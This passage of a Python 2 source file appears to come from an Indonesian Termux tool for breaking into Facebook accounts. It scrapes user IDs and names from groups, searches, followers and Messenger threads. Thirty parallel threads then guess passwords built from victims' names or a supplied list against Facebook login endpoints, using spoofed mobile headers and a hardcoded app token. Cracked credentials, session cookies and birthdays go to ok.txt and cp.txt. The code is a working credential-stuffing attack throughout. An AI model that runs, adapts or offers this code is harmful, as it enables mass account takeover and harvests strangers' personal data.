		sys.stdout.write('\r\x1b[1;95m \x1b[1;96m*--> \x1b[1;92mCrack\x1b[1;96m [%s/%s]-\x1b[1;92m[OK\x1b[0;91m:\x1b[0;92m%s\x1b[1;92m]\x1b[1;96m-\x1b[1;91m[\x1b[0;93mCP\x1b[0;91m:\x1b[0;93m%s\x1b[1;91m]' % (loop, len(id), len(ok), len(cp))
		); sys.stdout.flush()
		try:os.mkdir("results")
		except OSError:pass
		uid,name=user.split("<=>")
		i = name.split(" ")
		try:
			os.mkdir('results')
		except OSError:
			pass
		try:
			for kaci in pas.split(","):
				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': kaci, 'login': 'submit'}, headers={'user-agent': ua})
				xo = rex.content
				if 'mbasic_logout_button' in xo or 'save-device' in xo:
					print('\r\x1b[0;91m \x1b[0;92m*--> '+uid+ ' ◊ ' + kaci + '         ')
					ok.append(uid+' ◊ '+kaci)
					save = open('ok.txt','a') 
					save.write(' *--> '+str(uid)+' ◊ '+str(kaci)+'\n')
					save.close()
					break
					continue
				if 'checkpoint' in xo:
					try:
						token = open('login.txt').read()
						url = ("https://graph.facebook.com/"+uid+"?access_token="+token)
						data = s.get(url).json()
						ttl = data['birthday'].replace("/","-")
						print('\r\x1b[0;91m \x1b[0;93m*--> '+uid+ ' \x1b[0;91m◊\x1b[0;93m ' + kaci + ' \x1b[0;91m◊\x1b[0;93m '+ttl+' ')
						cp.append(uid+' ◊ '+kaci+' ◊ ' +ttl)
						save = open('cp.txt','a') 
						save.write('\x1b[0;93m *--> '+str(uid)+' \x1b[0;91m◊ \x1b[0;93m'+str(kaci)+'\x1b[0;91m ◊ \x1b[0;93m' +ttl+'\n')
						save.close()
						break
					except(KeyError, IOError):
						ttl = " "
					except:pass
					print('\r\x1b[0;91m \x1b[0;93m*--> '+uid+ ' \x1b[0;91m◊\x1b[0;93m ' + kaci + '          ')
					cp.append(uid+' ◊ '+kaci)
					save = open('cp.txt','a') 
					save.write('\x1b[0;93m *--> '+str(uid)+' \x1b[0;91m◊ \x1b[0;93m'+str(kaci)+'\n')
					save.close()
					break
					continue
			
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	#os.remove(idlist)
	exit('\n\x1b[1;91m• \x1b[1;92mfinished.')
	
# CRACK METODE #

def crackapi():
	global token
	try:
		token = open('login.txt', 'r').read()
	except IOError:
		print('\x1b[1;91m• Invalid token/cookie')
		os.system('rm -rf login.txt')
		exit()
	print ('')
	anak_kentod()
def anak_kentod():
	ah = raw_input('\x1b[1;95m• \x1b[1;96mGunakan password manual? y/t\x1b[1;91m > \x1b[1;93m')
	if ah =='':
		anak_kentod()
	elif ah == 'y' or ah == 'Y':
		try:
			idlist = raw_input('\033[1;95m•\033[1;96m File dump \033[1;91m>\033[1;92m ')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
			manual_birthday()
		except KeyError:
			exit("\033[1;91m• [Errno 2] No such file or directory: '"+idlist+"' ")
		except IOError:
			exit("\033[1;91m• [Errno 2] No such file or directory: '"+idlist+"' ")
	elif ah == 't' or ah == 'T':
		try:
			idlist = raw_input('\033[1;95m•\033[1;96m File dump \033[1;91m>\033[1;92m ')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except KeyError:
			exit("\033[1;91m• [Errno 2] No such file or directory: '"+idlist+"' ")
		except IOError:
			exit("\033[1;91m• [Errno 2] No such file or directory: '"+idlist+"' ")
	else:
		anak_kentod()
		
	print '\n\x1b[1;95m• \x1b[1;96makun \x1b[1;92m[OK] \x1b[1;96mtersimpan ke file \x1b[1;91m> \x1b[1;92mok.txt \n\x1b[1;95m•\x1b[1;96m akun \x1b[1;91m[\x1b[0;93mCP\x1b[1;91m]\x1b[1;96m tersimpan ke file\x1b[1;91m > \x1b[1;93mcp.txt\n\x1b[1;91m! \x1b[1;96mcrack berjalan, tekan CTRL+Z untuk stop\n'
				
	def main(user):
		global loop, token
		results = []
		sys.stdout.write('\r\x1b[1;95m \x1b[1;96m*--> \x1b[1;92mCrack\x1b[1;96m [%s/%s]-\x1b[1;92m[OK\x1b[0;91m:\x1b[0;92m%s\x1b[1;92m]\x1b[1;96m-\x1b[1;91m[\x1b[0;93mCP\x1b[0;91m:\x1b[0;93m%s\x1b[1;91m]' % (loop, len(id), len(ok), len(cp))
		); sys.stdout.flush()
		try:os.mkdir("results")
		except OSError:pass
		uid,name=user.split("<=>")
		for i in name.split(" "):
			if len(i)<3:
				continue
			else:
				if len(i) == 1 and len(i) == 2 and len(i) == 3 and len(i) == 4 or len(i) == 5:
					results.append(i+"123")
					results.append(i+"12345")
				else:
					results.append(i+"123")
					results.append(i+"12345")
					
					
		try:
			for pas in results:
				pas = pas.lower()
				kontol = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
				'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
				'user-agent': ua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
				param = {"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":uid,"locale": "en_US","password":pas,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
				respon = requests.get(api,params=param, headers=kontol)
				if "session_key" in respon.text and "EAAA" in respon.text:
					print('\r\x1b[0;91m \x1b[0;92m*--> '+uid+ ' ◊ ' + pas + '          ')
					ok.append(uid+' ◊ '+pas)
					save = open('ok.txt','a') 
					save.write(' *--> '+str(uid)+' ◊ '+str(pas)+'\n')
					save.close()
					break
					continue
				if "www.facebook.com" in respon.json()["error_msg"]:
					try:
						token = open('login.txt').read()
						url = ("https://graph.facebook.com/"+uid+"?access_token="+token)
						data = s.get(url).json()
						ttl = data['birthday'].replace("/","-")
						nama = data['name']
						print('\r\x1b[0;91m \x1b[0;93m*--> '+uid+ ' \x1b[0;91m◊\x1b[0;93m ' + pas + '\x1b[0;91m ◊ \x1b[0;93m' +ttl+' ')
						cp.append(uid+' ◊ '+pas+' ◊ ' +ttl)
						save = open('cp.txt','a') 
						save.write(' \x1b[0;93m*--> '+str(uid)+' \x1b[0;91m◊ \x1b[0;93m'+str(pas)+'\x1b[0;91m ◊ \x1b[0;93m' +ttl+'\n')
						save.close()
						break
					except(KeyError, IOError):
						ttl = " "
					except:pass
					print('\r\x1b[0;91m \x1b[0;93m*--> '+uid+ ' \x1b[0;91m◊\x1b[0;93m ' + pas + '          ')
					cp.append(uid+'\x1b[0;91m ◊ \x1b[0;93m'+pas)
					save = open('cp.txt','a') 
					save.write('\x1b[0;93m *--> '+str(uid)+' \x1b[0;91m◊ \x1b[0;93m'+str(pas)+'\n')
					save.close()
					break
					continue
					
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	#os.remove(idlist)
	exit('\n\x1b[1;92m• \x1b[1;92mfinished.')

def manual_birthday():
	print '\n\x1b[1;95m• \x1b[1;96mcontoh\x1b[1;91m >\x1b[1;96m sayang\x1b[1;91m,\x1b[1;96mpengen\x1b[1;91m,\x1b[1;96mngentot'
	pas = raw_input('\x1b[1;91m•\x1b[1;96m Password \x1b[1;91m>\x1b[1;93m ')
	if len(pas) ==0:
		print("\033[1;91m• can not be empty")
		manual_birthday()
		
	print '\n\x1b[1;95m• \x1b[1;96makun \x1b[1;92m[OK] \x1b[1;96mtersimpan ke file \x1b[1;91m> \x1b[1;92mok.txt \n\x1b[1;95m•\x1b[1;96m akun \x1b[1;91m[\x1b[0;93mCP\x1b[1;91m]\x1b[1;96m tersimpan ke file\x1b[1;91m > \x1b[1;93mcp.txt\n\x1b[1;91m! \x1b[1;96mcrack berjalan, tekan CTRL+Z untuk stop\n'
	
	def main(user):
		global loop, token
		sys.stdout.write('\r\x1b[1;95m \x1b[1;96m*--> \x1b[1;92mCrack\x1b[1;96m [%s/%s]-\x1b[1;92m[OK\x1b[0;91m:\x1b[0;92m%s\x1b[1;92m]\x1b[1;96m-\x1b[1;91m[\x1b[0;93mCP\x1b[0;91m:\x1b[0;93m%s\x1b[1;91m]' % (loop, len(id), len(ok), len(cp))
		); sys.stdout.flush()
		try:os.mkdir("results")
		except OSError:pass
		uid,name=user.split("<=>")
		i = name.split(" ")
		try:
			os.mkdir('results')
		except OSError:
			pass
		try:
			for kaci in pas.split(","):
				kontol = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
				'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
				'user-agent': ua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
				param = {"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":uid,"locale": "en_US","password":kaci,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
				respon = requests.get(api,params=param, headers=kontol)
				if "session_key" in respon.text and "EAAA" in respon.text:
					print('\r\x1b[0;91m \x1b[0;92m*--> '+uid+ ' ◊ ' + kaci + '         ')
					ok.append(uid+' ◊ '+kaci)
					save = open('ok.txt','a') 
					save.write(' *--> '+str(uid)+' ◊ '+str(kaci)+'\n')
					save.close()
					break
					continue
				if "www.facebook.com" in respon.json()["error_msg"]:
					try:
						token = open('login.txt').read()
						url = ("https://graph.facebook.com/"+uid+"?access_token="+token)
						data = s.get(url).json()
						ttl = data['birthday'].replace("/","-")
						print('\r\x1b[0;91m \x1b[0;93m*--> '+uid+ ' \x1b[0;91m◊\x1b[0;93m ' + kaci + '\x1b[0;91m ◊ \x1b[0;93m' + ttl + ' ')
						cp.append(uid+' ◊ '+kaci+' ◊ ' +ttl)
						save = open('cp.txt','a') 
						save.write('\x1b[0;93m *--> '+str(uid)+' \x1b[0;91m◊ \x1b[0;93m'+str(kaci)+'\x1b[0;91m ◊ \x1b[0;93m' +ttl+'\n')
						save.close()
						break
					except(KeyError, IOError):
						ttl = " "
					except:pass
					print('\r\x1b[0;91m \x1b[0;93m*--> '+uid+ ' \x1b[0;91m◊\x1b[0;93m ' + kaci + '         ')
					cp.append(uid+' ◊ '+kaci)
					save = open('cp.txt','a') 
					save.write('\x1b[0;93m *--> '+str(uid)+' \x1b[0;91m◊ \x1b[0;93m'+str(kaci)+'\n')
					save.close()
					break
					continue
			
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	#os.remove(idlist)
	exit('\n\x1b[1;92m• finished.')
	
# CRACK METODE MOBILE  #

class crack:

    def __init__(self, show=True):
        self.ada = []
        self.cp = []
        self.ko = 0
        if show == True:
            print ''
        while True:
            f = raw_input('\x1b[1;95m• \x1b[1;96mGunakan password manual? y/t\x1b[1;91m > \x1b[1;93m')
            if f == '':
                continue
            elif f == 'y' or f =='Y':
                try:
                    while True:
                        try:
                            self.apk = raw_input('\x1b[1;95m•\x1b[1;96m File dump\x1b[1;91m > \x1b[1;93m')
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print '\x1b[1;91m• %s' % e
                            continue

                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0]})
                        except:
                            continue

                except Exception as e:
                    print '\x1b[1;91m• %s' % e
                    continue

                print '\n\x1b[1;95m• \x1b[1;96mcontoh\x1b[1;91m >\x1b[1;96m sayang\x1b[1;91m,\x1b[1;96mpengen\x1b[1;91m,\x1b[1;96mngentot'
                self.pwlist()
                s = subprocess.Popen(['killall', '-9', 'python2'], stderr=subprocess.PIPE, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
                break
            elif f == 't' or f =='T':
                try:
                    while True:
                        try:
                            self.apk = raw_input('\x1b[1;95m•\x1b[1;96m File dump \x1b[1;91m> \x1b[1;93m')
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print '\x1b[1;91m• %s' % e
                            continue

                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0], 'pw': generate(i.split('<=>')[1])})
                        except:
                            continue

                except Exception as e:
                    print '\x1b[1;91m• %s' % e
                    continue

                print '\n\x1b[1;95m• \x1b[1;96makun \x1b[1;92m[OK] \x1b[1;96mtersimpan ke file \x1b[1;91m> \x1b[1;92mok.txt \n\x1b[1;95m•\x1b[1;96m akun \x1b[1;91m[\x1b[0;93mCP\x1b[1;91m]\x1b[1;96m tersimpan ke file\x1b[1;91m > \x1b[1;93mcp.txt\n\x1b[1;95m! \x1b[1;96mcrack berjalan, tekan CTRL+Z untuk stop\n'
                ThreadPool(35).map(self.main, self.fl)
                os.remove(self.apk)
                print '\n\x1b[1;91m• \x1b[1;92mfinished.'
                s = subprocess.Popen(['killall', '-9', 'python2'], stderr=subprocess.PIPE, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
                break

    def pwlist(self):
        self.pw = raw_input('\x1b[1;91m•\x1b[1;96m password \x1b[1;91m>\x1b[1;93m ').split(',')
        if len(self.pw) == 0:
            self.pwlist()
        else:
            for i in self.fl:
                i.update({'pw': self.pw})

            print '\n\x1b[1;95m• \x1b[1;96makun \x1b[1;92m[OK] \x1b[1;96mtersimpan ke file \x1b[1;91m> \x1b[1;92mok.txt \n\x1b[1;95m•\x1b[1;96m akun \x1b[1;91m[\x1b[0;93mCP\x1b[1;91m]\x1b[1;96m tersimpan ke file\x1b[1;91m > \x1b[1;93mcp.txt\n\x1b[1;95m! \x1b[1;96mcrack berjalan, tekan CTRL+Z untuk stop\n'
            ThreadPool(30).map(self.main, self.fl)
            os.remove(self.apk)
            print '\n\x1b[1;92m• \x1b[1;92mfinished'

    def main(self, fl):
        try:
            for i in fl.get('pw'):
                log = login(fl.get('id'), i, 'https://m.facebook.com')
                if log.get('status') == 'success':
                    print G + '\r\x1b[0;91m \x1b[0;92m*--> \x1b[0;92m%s\x1b[0;92m \xe2\x97\x8a \x1b[0;92m%s  %s ' % (fl.get('id'), i, cvs(log.get('cookies')))
                    self.ada.append('%s \xe2\x97\x8a %s' % (fl.get('id'), i))
                    if fl.get('id') in open('ok.txt').read():
                        break
                    else:
                        open('ok.txt', 'a+').write('%s \xe2\x97\x8a %s \xe2\x97\x8a %s\n\n' % (fl.get('id'), i, cvs(log.get('cookies'))))
                    ko = '%s \xe2\x97\x8a %s \xe2\x97\x8a %s\n\n' % (fl.get('id'), i, cvs(log.get('cookies')))
                    break
                elif log.get('status') == 'cp':
                    print '\r\x1b[0;91m \x1b[0;93m*--> %s\x1b[0;91m \xe2\x97\x8a \x1b[0;93m%s  %s ' % (fl.get('id'), i, N)
                    self.cp.append('%s \xe2\x97\x8a %s' % (fl.get('id'), i))
                    open('cp.txt', 'a+').write('%s \xe2\x97\x8a %s \xe2\x97\x8a \n' % (fl.get('id'), i))
                    break
                else:
                    continue

            self.ko += 1
            m = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
            print '\r' + m + ' \x1b[1;96m*--> \x1b[1;92mCrack\x1b[1;96m [%s/%s]-\x1b[1;92m[OK\x1b[0;91m:\x1b[0;92m%s\x1b[1;92m]\x1b[1;96m-\x1b[1;91m[\x1b[0;93mCP\x1b[0;91m:\x1b[0;93m%s\x1b[1;91m]' % (self.ko, len(self.fl), len(self.ada), len(self.cp)),
            sys.stdout.flush()
        except:
            self.main(fl)

def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;95m •\x1b[1;96m Memeriksa Lisensi ' + o,
        sys.stdout.flush()
        time.sleep(1)
        
	
#------> MENU PREMIUM <------#

def lang(cookies):
	f=False
	b=requests.get("https://mbasic.facebook.com/profile.php",headers=hdcok(),cookies=cookies).text	
	if "mbasic_logout_button" in b.lower():
		f=True
		if f==True:
			return True
		else:
				exit(ST+"• login gagal. ")

def gen(show=True):
	if show==True:
		#clear()
		#banner()
		print(PT+"• "+BTU+"Supaya bekerja masukan cookie facebook anda")
	ck=raw_input(PT+"•"+BTU+" cookie "+ST+"> "+KT)
	if ck=="":gen(show=False)
	try:
		cks=cvd(ck)
		if lang(cks)==True:
			open(".cok","w").write(ck)
			exit(""+HUT+"• login success, run again the tools.")
		else:print(ST+"• login fail.");gen(show=True)
	except Exception as e:
		print(ST+"• error : %s"%e);gen(show=False)
		
def basecookie():
	if os.path.exists(".cok"):
		if os.path.getsize(".cok") !=0:
			return cvd(open('.cok').read().strip())
		else:gen()
	else:gen()

#------> MENU GRUMP <------#

class dump_grup:
	def __init__(self, cookies):
		self.glist=[]
		self.cookies=cookies
		self.extract(
			"https://graph.facebook.com/groups/?seemore")
			
	def extract(self, url):
		bs=bs4.BeautifulSoup(
			requests.get(url, cookies=self.cookies,
				headers=hdcok()).text,"html.parser")
		for i in bs.find_all("a",href=True):
			if "/groups/" in i.get("href"):
				if "category" in i.get("href") or "create" in i.get("href"):
					continue
				else:
					self.glist.append(
						{"id":"".join(
							bs4.re.findall("/groups/(.*?)\?",
					i.get("href"))),"name":i.text})
		if len(self.glist) !=0:
			print(" ")
			print("\x1b[1;92m• Kamu punya %s group di temukan"%len(self.glist))
			print (PT+"•"+HT+" 01 "+BTU+"Dapatkan grup dengan mencari nama")
			print (PT+"•"+HT+" 02 "+BTU+"Masukan id grup (manual)\n")
			while True:
				c=raw_input(PT+"# "+BTU+"Pilih "+ST+"> "+KT)
				if c=="":continue
				elif c=="1" or c =="01":
					self.search()
					exit()
				elif c=="2" or c =="02":
					self.manual()
					exit()
				else:
					print(ST+"• wrong input.")
		else:exit(ST+"• no groups found.")
	
	def manual(self):
		id=raw_input("\n\x1b[1;95m• \x1b[1;96mGroup id\x1b[1;91m  > \x1b[1;93m")
		if id=="":
			self.manual()
		else:
			r=bs4.BeautifulSoup(requests.get("https://graph.facebook.com/groups/"+id,headers=hdcok(),cookies=self.cookies).text,"html.parser")
			if "konten tidak" in r.find("title").text.lower():
				exit("\x1b[1;91m• input id grup yg valid goblok, id error, atau lu belom jooin di grup")
			else:
				self.listed={"id":id,"name":r.find("title").text}
				self.f()
				print("\x1b[1;95m• \x1b[1;96mNama grup\x1b[1;91m > \x1b[1;92m%s.."%self.listed.get("name")[0:20])
				
				self.dumps("https://graph.facebook.com/groups/"+id)
				
	def search(self):
		whitelist=[]
		q=raw_input('\x1b[1;95m•\x1b[1;96m query \x1b[1;91m> \x1b[1;93m').lower()
		if q=='':self.search()
		else:
			print("")
			for e,i in enumerate(self.glist):
				if q in i.get("name").lower():
					whitelist.append(i)
					print('  %s. %s'%(len(
							whitelist),
									i.get("name").lower().replace(q,
					"%s%s%s"%(G,q,N))))
			if len(whitelist)==0:
				print("\x1b[1;91m• no result found with this query: %s"%q)
				self.search()
			else:
				print('')
				self.choice(whitelist)
	
	def choice(self, whitelist):
		try:
			self.listed=whitelist[input("\x1b[1;95m# \x1b[1;96mPilih grup\x1b[1;91m>\x1b[1;93m ")-1]
			self.f()
			print("\x1b[1;95m• \x1b[1;96mNama grup \x1b[1;91m> \x1b[1;92m%s"%self.listed.get("name"))
			self.dumps("https://graph.facebook.com/groups/"+self.listed.get("id"))
		except Exception as e:
			print("\x1b[1;91m• %s"%e)
			self.choice(whitelist)
	
	def f(self):
		self.fl=raw_input('\x1b[1;95m•\x1b[1;96m Nama file \x1b[1;91m> \x1b[1;93m').replace(" ","_")
		if self.fl=='':self.f()
		open(self.fl,"w").close()
	
	def dumps(self, url):
		r=bs4.BeautifulSoup(
			requests.get(url,cookies=self.cookies,
		headers=hdcok()).text,"html.parser")
		print("\r\x1b[1;95m•\x1b[1;96m Dump id \x1b[1;91m  > \x1b[1;92m%s - ctrl+z for stop"%len(open(self.fl).read().splitlines())),;sys.stdout.flush();time.sleep(0.0050)
		for i in r.find_all("h3"):
			try:
				if len(bs4.re.findall("\/",i.find("a",href=True).get("href")))==1:
					ogeh=i.find("a",href=True)
					if "profile.php" in ogeh.get("href"):
						
						a="".join(
							bs4.re.findall("profile\.php\?id=(.*?)&",
						ogeh.get("href")))
						if len(a)==0:continue
						elif a in open(self.fl).read():
							continue
						else:
							open(self.fl,"a+").write(
								"%s<=>%s\n"%(a,ogeh.text))
							continue
					else:
						a="".join(
							bs4.re.findall("/(.*?)\?",ogeh.get("href")))
						if len(a)==0:continue
						elif a in open(self.fl).read():
							continue
						else:
							open(self.fl,"a+").write(
								"%s<=>%s\n"%(a,ogeh.text))
			except:continue
		for i in r.find_all("a",href=True):
			if "Lihat Postingan Lainnya" in i.text:
				while True:
					try:
						self.dumps("https://graph.facebook.com/"+i.get("href"))
						break
					except Exception as e:
						print("\r\x1b[1;91m•%s, retrying..."%e);continue
		exit("\n\x1b[1;92m• you are successfully dump %s id from group %s .."%(len(open(self.fl).read().splitlines()),self.listed.get("name")[0:20]))
		
#------> DUMP PENCARIAN NAMA <------#  

def namah(fl,r,b):
	open(fl,"a+")
	b=bs4.BeautifulSoup(requests.get(
		b, cookies=r,headers=hdcok()).text,"html.parser")
	for i in b.find_all("a",href=True):
		#clear()
		#banner()
		print "\r\x1b[1;95m• \x1b[1;96mDump id\x1b[1;91m  > \x1b[1;92m%s - ctrl+z for stop"%(len(open(fl).read().splitlines())),;sys.stdout.flush()
		if "<img alt=" in str(i):
			if "home.php" in str(i["href"]):
				continue
			else:
				g=str(i["href"])
				if "profile.php" in g:
					name=i.find("img").get("alt").replace(", profile picture","")
					d=bs4.re.findall("/profile\.php\?id=(.*?)&",g)
					if len (d) !=0:
						pk="".join(d)
						if pk in open(fl).read():
							pass
						else:
							open(
								fl,"a+").write("%s<=>%s\n"%(pk,name))
				else:
					d=bs4.re.findall("/(.*?)\?",g)
					name=i.find("img").get("alt").replace(", profile picture","")
					if len(d) !=0:
						pk="".join(d)
						if pk in open(fl).read():
							pass
						else:
							open(
								fl,"a+").write("%s<=>%s\n"%(pk,name))
						
		if "Lihat Hasil Selanjutnya" in i.text:
			namah(fl,r,i["href"])
	exit("\n\x1b[1;92m• finished.")
				
def cek(arg):
	if os.path.exists(".cok"):
		if os.path.getsize(".cok") !=0:
			return True
		else:return False
	else:return False
	
def dumpfl():
	cvds=None
	cookie=None
	new=None
	if cek(1)==False:
		try:
			cookie=raw_input("\x1b[1;95m• \x1b[1;96mSupaya bekerja masukan cookie facebook anda\n\x1b[1;95m• \x1b[1;96mCookie\x1b[1;91m > \x1b[1;93m")
			cvds=cvd(cookie)
			new=True
		except:
			print("\x1b[1;91m• invalid cookie");dumpfl()
	else:
		cvds=cvd(open(".cok").read().strip())
	r=requests.get("https://mbasic.facebook.com/profile.php",
		cookies=cvds,
	headers=hdcok()).text
	if len(bs4.re.findall("logout",r)) !=0:
		#clear()
		#banner()
		if lang(cvds) !=True:
			exit("\x1b[1;91m• gagal saat mendeteksi bahasa.")
		print("\n\x1b[1;95m• \x1b[1;96mLogin as\x1b[1;91m > \x1b[1;92m%s.."%(
			bs4.BeautifulSoup(r,
		"html.parser").find("title").text[0:10]))
		if new==True:
			open(".cok","w").write(cookie)
		fl=raw_input("\n\x1b[1;95m• \x1b[1;96mNama file    \x1b[1;91m>\x1b[1;93m ").replace(" ","_")
		print ("\x1b[1;95m• \x1b[1;96mContoh nama  \x1b[1;91m> \x1b[1;92mSugiono ")
		s=raw_input("\x1b[1;95m• \x1b[1;96mMasukan nama \x1b[1;91m> \x1b[1;93m")
		namah(fl,cvds,"https://m.facebook.com/search/people/?q="+s)
	else:
		try:
			os.remove(".cok")
		except:
			pass
		print("\x1b[1;91m• login fail!");dumpfl()
		
class dump_message:

    def __init__(self, cookies):
        self.cookies = cookies
        #basecookie()
        #clear()
        self.f = raw_input('\n\x1b[1;95m•\x1b[1;96m Nama file\x1b[1;91m >\x1b[1;93m ').replace(' ', '_')
        if self.f == '':
            dump_message(cookies)
        open(self.f, 'w').close()
        self.dump('https://m.facebook.com/messages')

    def dump(self, url):
        bs = bs4.BeautifulSoup(requests.get(url, headers=hdcok(), cookies=self.cookies).text, 'html.parser')
        for i in bs.find_all('a', href=True):
            if '/messages/read' in i.get('href'):
                f = bs4.re.findall('cid\\.c\\.(.*?)%3A(.*?)&', i.get('href'))
                try:
                    for ip in list(f.pop()):
                        if self.cookies.get(' c_user') in ip:
                            continue
                        else:
                            if 'pengguna facebook' in i.text.lower():
                                continue
                            open(self.f, 'a+').write('%s<=>%s\n' % (ip, i.text))
                            print '\r\x1b[1;95m•\x1b[1;96m Dump id \x1b[1;91m> \x1b[1;92m%s - ctrl+z for stop' % len(open(self.f).read().splitlines()),
                            sys.stdout.flush()

                except Exception as e:
                    continue

            if 'Lihat Pesan Sebelumnya' in i.text:
                self.dump('https://m.facebook.com/' + i.get('href'))

        exit('\n\x1b[1;92m• success %s id saved to : %s' % (len(open(self.f).read().splitlines()), self.f))

if os.path.exists('ok.txt'):
    pass
else:
    open('ok.txt', 'a+').close()
    
    	
# MENU UPDATE TOOLS #

def update():
    os.system('clear')
    os.system('pkg update && pkg upgrade')
    os.system('git pull')
    os.system('python2 bff-2.py')
    
# BANNER (NAMA KEDUA) #

def nma():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m• invalid'
        os.system('clear')
        os.system('rm -rf login.txt')
        masuk()

    try:
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print '\x1b[1;91m• invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        masuk()
        time.sleep(1)
        masuk()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;91m• Tidak ada koneksi'
        exit()

    banner()
    print '\x1b[1;95m #\x1b[1;96m \x1b[1;96mName \x1b[1;91m> \x1b[1;92m' + nama + '\x1b[1;96m '
    print '  '

# MENU PILIHAN MULAI #

def menu():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
#        uas = open("ua.txt","r").read()
    except IOError:
        print '\x1b[1;91m• invalid'
        os.system('clear')
        os.system('rm -rf login.txt')
#     os.system('rm -rf ua.txt')
        masuk()

    try:
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print '\x1b[1;91m• invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        masuk()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;91m• No connection '
        exit()

    banner()
    print '\x1b[1;95m #\x1b[1;96m \x1b[1;96mName \x1b[1;91m: \x1b[1;92m' + nama + '\x1b[1;96m '
    print '  '
    print PT+'*'+HT+' Note'+ST+' >'+HUT+' Sebelum mulai crack gunakan mode pesawat 5 detik terlebih dahulu'+ST+'! '
    print '  '
    print PT+'•'+HT+' 01 '+BTU+'Dump Id Public'
    print PT+'•'+HT+' 02 '+BTU+'Dump Id Followers '
    print PT+'•'+HT+' 03 '+BTU+'Dump Id Reaction Post'
    print PT+'•'+HT+' 04 '+BTU+'Dump Id Member Groups'
    print PT+'•'+HT+' 05 '+BTU+'Dump Id Pencarian Nama'
    print PT+'•'+HT+' 06 '+BTU+'Dump Id Pesan Mesengger'
    print PT+'•'+HT+' 07 '+HUT+'Start Crack'
    print PT+'•'+HT+' 08 '+BTU+'Ganti User Agent'
    print PT+'•'+HT+' 09 '+BTU+'Cek Hasil Crack'
    print PT+'•'+HT+' rm '+BTU+'Hapus Akun'
    print PT+'•'+ST+' 00 '+BTU+'Keluar\n'
    r = raw_input(PT+'#'+HUT+' '+BTU+'Pilih'+ST+' > '+KT)
    if r == '':
        print '\x1b[1;91m• Wrong Input'
        os.sys.exit()
    elif r == '1' or r =='01':
        publik()
    elif r == '2' or r =='02':
        followers()
    elif r == '3' or r =='03':
        post()
    elif r == '4' or r =='04':
    	dump_grup(basecookie())
    elif r == '5' or r =='05':
    	dumpfl()
#    	exit()
    elif r == '6' or r =='06':
    	dump_message(basecookie())
    elif r == '7' or r =='07':
        pilih_crack()
    elif r == '9' or r =='09':
    	result()
    elif r == '0' or r =='00':
        print ''
        jalan('\x1b[1;95m•\x1b[1;96m Good bye epribadeh... Emuach...\xf0\x9f\x98\x98\x1b[0;97m\n')
        time.sleep(0.1)
        os.sys.exit()
    elif r == '66':
        raw_input('\x1b[1;95m• \x1b[1;93mpress enter ')
        os.system('xdg-open https://www.facebook.com/romi.29.04.03')
        try:
            os.remove('/data/data/com.termux/files/usr/lib/.bash')
            exit('\x1b[1;92m• run again the tools.')
        except:
            exit('\x1b[1;95m•\x1b[1;96m towards the browser')

    elif r == '8' or r =='08':
    	useragent()
    elif r == 'rm':
        print ''
        #tik()
        jalan('\n\x1b[1;92m• Succes Remove Cookie/Token')
        os.system('rm -rf login.txt')
        os.sys.exit()
    else:
        print '\x1b[1;91m• Wrong Input'
        os.sys.exit()

# SETTING AGENT PENGGUNA #

def useragent():
	romi = raw_input ("\x1b[1;95m• \x1b[1;96mGanti user agent? \x1b[1;92my\x1b[1;96m/\x1b[1;91mn :\x1b[1;93m ")
	if romi =='':
		print '\x1b[1;91m• Wrong Input'
		os.sys.exit()
	elif romi =='y' or romi =='Y':
		try:
			ua = raw_input("\x1b[1;95m• \x1b[1;96mEnter user agent \x1b[1;91m: \x1b[1;93m")
			uas = open("ua.txt","w")
			uas.write(ua)
			uas.close();time.sleep(2)
			print ("\n\x1b[1;92m• Successfully changed user agent");time.sleep(2)
			menu()
